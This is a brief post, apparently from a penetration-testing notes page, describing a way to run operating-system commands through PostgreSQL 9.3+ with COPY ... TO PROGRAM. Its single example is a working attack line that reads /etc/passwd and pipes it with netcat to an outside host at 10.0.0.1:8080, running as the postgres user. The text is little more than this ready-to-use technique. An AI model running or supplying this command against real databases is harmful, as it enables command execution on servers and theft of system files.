pentest monkey has 2 methods to execute commands with postgres SQL.  Here's a new way I discovered in early 2018 that was introduced in 9.3+

Command Execution:	
COPY pg_catalog.pg_language TO PROGRAM 'cat /etc/passwd | nc 10.0.0.1 8080';  â€” priv, commands run as postgres/pgsql OS-level user  (postgres SQL 9.3+)
